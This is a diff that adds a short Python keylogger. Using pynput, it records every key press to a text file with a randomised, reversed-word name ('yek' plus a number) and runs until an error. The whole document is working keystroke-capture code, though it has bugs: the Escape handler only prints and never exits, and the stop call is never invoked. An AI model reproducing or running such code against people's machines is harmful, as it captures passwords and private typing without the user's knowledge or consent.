@@ -1,0 +1,33 @@
+from pynput.keyboard import Listener, Key
+import sys
+import random
+
+
+
+def quit_program():
+    print('Ending...')
+
+def write_key(key):
+    try:
+        with open(log, 'a') as file:
+            file.write(f'{str(key)} \n')
+    except Exception as e:
+        print(f"Couldn't catch key {e}")
+        quit_program()
+
+    if key == Key.esc:
+        quit_program()
+
+rand_num = random.randint(0,1000)
+log = f'yek{rand_num}.txt'
+print('Start listen to keys.')
+
+with Listener(on_press=write_key) as logs:
+    try:
+        logs.join()
+    except Exception as e:
+        print('Error during the program execution')
+    
+    finally:
+        logs.stop
+        quit_program()
